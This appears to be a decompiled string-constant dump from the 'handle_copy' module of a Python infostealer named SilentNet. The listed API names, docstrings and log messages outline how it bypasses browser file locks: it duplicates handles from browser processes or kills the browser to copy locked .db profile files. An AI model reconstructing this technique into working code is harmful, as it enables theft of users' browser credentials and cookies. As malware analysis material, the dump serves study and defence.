"""
SilentNet Infostealer - Decompiled Module
Module: .app.util.handle_copy
Chunk size: 5442 bytes
String constants: 39 unicode, 306 identifiers

# Handle duplication to bypass browser file locks
# Original path: app/util/handle_copy.py
"""

# ============================================================
# RECONSTRUCTED FROM NUITKA CONSTANT POOL
# Method: Rolling XOR + substitution cipher decryption
# All string literals, SQL queries, paths, and identifiers
# are authentic - extracted directly from compiled binary.
# ============================================================

# --- STRING CONSTANTS (in order of appearance) ---

# identifier: lower
# identifier: kernel32
# identifier: CreateToolhelp32Snapshot
# identifier: TH32CS_SNAPPROCESS
# identifier: PROCESSENTRY32W
# identifier: sizeof
# identifier: dwSize
# identifier: Process32FirstW
# identifier: byref
# identifier: pe
# identifier: szExeFile
# identifier: pids
# identifier: th32ProcessID
# identifier: Process32NextW
# identifier: snap
# identifier: CloseHandle
'Get all PIDs for processes with given executable name.'
# identifier: get_processes_by_name
# identifier: OpenProcess
# identifier: PROCESS_TERMINATE
# identifier: TerminateProcess
# identifier: killed
# identifier: LoggingManager
# identifier: add
# identifier: _MODULE
'Killed processes'
# identifier: LogType
# identifier: DEBUG
'name='
' count='
# identifier: create_unicode_buffer
# identifier: QueryDosDeviceW
# identifier: value
'Convert DOS path (C:\\...) to NT path (\\Device\\HarddiskVolume1\\...).'
# identifier: create_string_buffer
# identifier: ULONG
# identifier: ntdll
# identifier: NtQuerySystemInformation
# identifier: SystemExtendedHandleInformation
# identifier: STATUS_SUCCESS
# identifier: STATUS_INFO_LENGTH_MISMATCH
# identifier: raw
'Query system handles failed'
# identifier: ERROR
'Query all system handles.'
# identifier: HANDLE
# identifier: OBJECT_ATTRIBUTES
# identifier: Length
# identifier: CLIENT_ID
# identifier: UniqueProcess
# identifier: NtOpenProcess
# identifier: PROCESS_DUP_HANDLE
'Open a process with PROCESS_DUP_HANDLE access.'
# identifier: GetCurrentProcess
# identifier: NtDuplicateObject
# identifier: DUPLICATE_SAME_ACCESS
'Duplicate a handle from source process to current process.'
# identifier: name
# identifier: query
'_get_handle_name.<locals>.query'
# identifier: threading
# identifier: Thread
# identifier: target
# identifier: daemon
# identifier: start
# identifier: join
# identifier: timeout
# identifier: is_alive
# identifier: name
'Get the NT object name for a handle with timeout to avoid pipe hangs.'
# identifier: NtQueryObject
# identifier: handle
# identifier: ObjectNameInformation
# identifier: OBJECT_NAME_INFORMATION
# identifier: from_buffer_copy
# identifier: Name
# identifier: Buffer
# identifier: wstring_at
# identifier: result
# identifier: IO_STATUS_BLOCK
# identifier: FILE_STANDARD_INFORMATION
# identifier: NtQueryInformationFile
# identifier: FileStandardInformation
# identifier: EndOfFile
'Get file size via handle.'
# identifier: LARGE_INTEGER
# identifier: NtReadFile
# identifier: Information
'Read entire file contents through a handle.'
# identifier: rb
# identifier: __enter__
# identifier: __exit__
# identifier: read
'Check if a file is locked by another process.'
# identifier: _dos_path_to_nt_path
'\\user data\\'
'\\opera stable\\'
'\\opera gx stable\\'
# identifier: target_nt
# identifier: find
# identifier: _query_system_handles
# identifier: from_bytes
# identifier: little
# identifier: SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
# identifier: base_offset
# identifier: entry_size
# identifier: UniqueProcessId
# identifier: process_cache
# identifier: _open_process_for_dup
# identifier: _duplicate_handle
# identifier: HandleValue
# identifier: _get_handle_name
# identifier: markers
# identifier: name_lower
# identifier: target_suffix
# identifier: endswith
# identifier: _get_file_size
# identifier: _read_file_via_handle
# identifier: wb
# identifier: write
# identifier: values
'Handle dup copy failed'
'Try to copy file using handle duplication from browser processes.'
'File not found'
'path='
# identifier: is_file_locked
# identifier: shutil
# identifier: copy2
'Direct copy'
'src='
'Direct copy failed'
'error='
'Trying handle dup'
'browser='
' pids='
# identifier: _try_handle_dup_copy
'Handle dup copy'
'Killing browser'
# identifier: WARN
# identifier: kill_process_by_name
# identifier: time
# identifier: sleep
'Post-kill copy'
'All copy strategies failed'
' error='
# identifier: tempfile
# identifier: mkstemp
# identifier: suffix
# identifier: close
# identifier: copy_browser_file
# identifier: unlink
'Temp copy failed'
# identifier: __doc__
# identifier: __file__
# identifier: origin
# identifier: has_location
# identifier: __cached__
# identifier: os
# identifier: ctypes
# identifier: wintypes
# identifier: Structure
# identifier: POINTER
# identifier: pathlib
# identifier: Path
# identifier: Path
# identifier: logging
# identifier: LoggingManager
# identifier: LogType
# identifier: handle_copy
# identifier: c_long
# identifier: NTSTATUS
# identifier: windll
# identifier: __prepare__
# identifier: UNICODE_STRING
# identifier: __getitem__
'%s.__prepare__() must return a mapping, not %s'
# identifier: __name__
'<metaclass>'
# identifier: __module__
# identifier: __qualname__
# identifier: USHORT
# identifier: MaximumLength
# identifier: LPWSTR
# identifier: _fields_
# identifier: __orig_bases__
# identifier: UniqueThread
# identifier: RootDirectory
# identifier: ObjectName
# identifier: Attributes
# identifier: SecurityDescriptor
# identifier: LPVOID
# identifier: SecurityQualityOfService
# identifier: Object
# identifier: c_ulonglong
# identifier: GrantedAccess
# identifier: CreatorBackTraceIndex
# identifier: ObjectTypeIndex
# identifier: HandleAttributes
# identifier: Reserved
# identifier: Status
# identifier: AllocationSize
# identifier: NumberOfLinks
# identifier: DeletePending
# identifier: BOOLEAN
# identifier: Directory
# identifier: DWORD
# identifier: cntUsage
# identifier: th32DefaultHeapID
# identifier: th32ModuleID
# identifier: cntThreads
# identifier: th32ParentProcessID
# identifier: pcPriClassBase
# identifier: LONG
# identifier: dwFlags
# identifier: WCHAR
# identifier: argtypes
# identifier: restype
# identifier: BOOL
# identifier: LPCWSTR
# identifier: UINT
# identifier: name
# identifier: return
# identifier: name
# identifier: return
# identifier: dos_path
# identifier: return
# identifier: return
# identifier: pid
# identifier: return
# identifier: source_proc
# identifier: source_handle
# identifier: return
# identifier: handle
# identifier: timeout_ms
# identifier: return
# identifier: handle
# identifier: return
# identifier: handle
# identifier: size
# identifier: return
# identifier: path
# identifier: return
# identifier: src_path
# identifier: dst_path
# identifier: browser_pids
# identifier: return
# identifier: src_path
# identifier: dst_path
# identifier: browser_exe
# identifier: return
'.db'
# identifier: src_path
# identifier: browser_exe
# identifier: suffix
# identifier: return
# identifier: get_temp_copy
'app\\util\\handle_copy.py'
'<module app.util.handle_copy>'
# identifier: __class__
# identifier: dos_path
# identifier: path_str
# identifier: drive
# identifier: device_buf
# identifier: source_proc
# identifier: source_handle
# identifier: target_handle
# identifier: current
# identifier: status
# identifier: handle
# identifier: io_status
# identifier: info
# identifier: status
# identifier: handle
# identifier: timeout_ms
# identifier: result
# identifier: query
# identifier: handle
# identifier: oa
# identifier: cid
# identifier: status
# identifier: buf_size
# identifier: buf
# identifier: return_length
# identifier: status
# identifier: size
# identifier: buf
# identifier: io_status
# identifier: offset
# identifier: status
# identifier: src_path
# identifier: dst_path
# identifier: browser_pids
# identifier: target_nt
# identifier: markers
# identifier: target_suffix
# identifier: marker
# identifier: pos
# identifier: my_pid
# identifier: pid_set
# identifier: handle_data
# identifier: num_handles
# identifier: entry_size
# identifier: base_offset
# identifier: process_cache
# identifier: entry
# identifier: pid
# identifier: proc_handle
# identifier: dup_handle
# identifier: name
# identifier: name_lower
# identifier: matches
# identifier: size
# identifier: data
# identifier: dst_path
# identifier: browser_exe
# identifier: time
# identifier: name
# identifier: pids
# identifier: name_lower
# identifier: snap
# identifier: pe
# identifier: src_path
# identifier: browser_exe
# identifier: suffix
# identifier: fd
# identifier: temp_path
# identifier: pids
# identifier: killed
# identifier: pid
# identifier: handle
# identifier: buf
# identifier: return_length
# identifier: status
# identifier: info
# identifier: handle
# identifier: result
# identifier: handle
# identifier: result
# identifier: __spec__
